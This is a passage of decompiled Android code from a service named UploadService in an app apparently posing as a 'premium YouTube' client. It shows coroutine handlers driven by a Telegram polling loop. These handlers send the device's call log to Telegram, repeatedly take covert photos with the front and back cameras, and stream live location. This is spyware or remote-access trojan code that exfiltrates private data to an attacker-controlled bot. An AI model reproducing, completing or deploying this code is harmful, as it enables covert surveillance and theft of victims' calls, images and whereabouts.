                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$15, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$15", f = "UploadService.kt", i = {}, l = {1582}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass15 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass15(UploadService uploadService, Continuation<? super AnonymousClass15> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass15(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۸۵String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch14$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$16, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$16", f = "UploadService.kt", i = {}, l = {1583}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass16 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass16(UploadService uploadService, Continuation<? super AnonymousClass16> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass16(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        UploadService uploadService = this.this$0;
                        this.label = 1;
                        if (uploadService.sendTextFile(uploadService.getCallLogInfo(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۴۸String$arg1$callsendTextFile$fun$anonymous$$arg2$calllaunch1$branch14$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$17, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$17", f = "UploadService.kt", i = {}, l = {1587}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass17 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass17(UploadService uploadService, Continuation<? super AnonymousClass17> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass17(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۸۷String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch15$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$18, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$18", f = "UploadService.kt", i = {}, l = {1591}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass18 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass18(UploadService uploadService, Continuation<? super AnonymousClass18> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass18(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۸۹String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch16$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$19, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$19", f = "UploadService.kt", i = {}, l = {1596}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass19 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass19(UploadService uploadService, Continuation<? super AnonymousClass19> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass19(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۹۱String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch17$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$20, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$20", f = "UploadService.kt", i = {}, l = {1600}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass20 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass20(UploadService uploadService, Continuation<? super AnonymousClass20> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass20(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۹۳String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch18$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$21, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$21", f = "UploadService.kt", i = {}, l = {1609}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass21 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass21(UploadService uploadService, Continuation<? super AnonymousClass21> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass21(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) throws CameraAccessException {
                AnonymousClass21 anonymousClass21;
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        anonymousClass21 = this;
                        break;
                    case 1:
                        anonymousClass21 = this;
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                while (anonymousClass21.this$0.backgroundCameraFront) {
                    anonymousClass21.this$0.takeAndSendPhoto(LiveLiterals$UploadServiceKt.INSTANCE.m۱۸۴Boolean$arg0$calltakeAndSendPhoto$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setcameraFrontJob$$branch19$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                    anonymousClass21.label = 1;
                    if (DelayKt.delay(LiveLiterals$UploadServiceKt.INSTANCE.m۳۳۰Long$arg0$calldelay$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setcameraFrontJob$$branch19$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) anonymousClass21) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$22, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$22", f = "UploadService.kt", i = {}, l = {1612}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass22 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass22(UploadService uploadService, Continuation<? super AnonymousClass22> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass22(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۹۵String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch19$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$23, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$23", f = "UploadService.kt", i = {}, l = {1618}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass23 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass23(UploadService uploadService, Continuation<? super AnonymousClass23> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass23(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۹۸String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch20$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$24, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$24", f = "UploadService.kt", i = {}, l = {1626}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass24 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass24(UploadService uploadService, Continuation<? super AnonymousClass24> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass24(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) throws CameraAccessException {
                AnonymousClass24 anonymousClass24;
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        anonymousClass24 = this;
                        break;
                    case 1:
                        anonymousClass24 = this;
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                while (anonymousClass24.this$0.backgroundCameraBack) {
                    anonymousClass24.this$0.takeAndSendPhoto(LiveLiterals$UploadServiceKt.INSTANCE.m۱۸۲Boolean$arg0$calltakeAndSendPhoto$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setcameraBackJob$$branch21$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                    anonymousClass24.label = 1;
                    if (DelayKt.delay(LiveLiterals$UploadServiceKt.INSTANCE.m۳۲۸Long$arg0$calldelay$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setcameraBackJob$$branch21$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) anonymousClass24) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$25, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$25", f = "UploadService.kt", i = {}, l = {1629}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass25 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass25(UploadService uploadService, Continuation<? super AnonymousClass25> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass25(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۰۰String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch21$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$26, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$26", f = "UploadService.kt", i = {}, l = {1635}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass26 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass26(UploadService uploadService, Continuation<? super AnonymousClass26> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass26(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۰۲String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch22$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$27, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$27", f = "UploadService.kt", i = {}, l = {1645}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass27 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass27(UploadService uploadService, Continuation<? super AnonymousClass27> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass27(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                AnonymousClass27 anonymousClass27;
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        anonymousClass27 = this;
                        break;
                    case 1:
                        anonymousClass27 = this;
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                while (anonymousClass27.this$0.liveLocationEnabled) {
                    anonymousClass27.this$0.sendCurrentLocationToTelegram();
                    anonymousClass27.label = 1;
                    if (DelayKt.delay(LiveLiterals$UploadServiceKt.INSTANCE.m۳۳۲Long$arg0$calldelay$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setliveLocationJob$$branch23$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) anonymousClass27) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$28, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$28", f = "UploadService.kt", i = {}, l = {1648}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass28 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

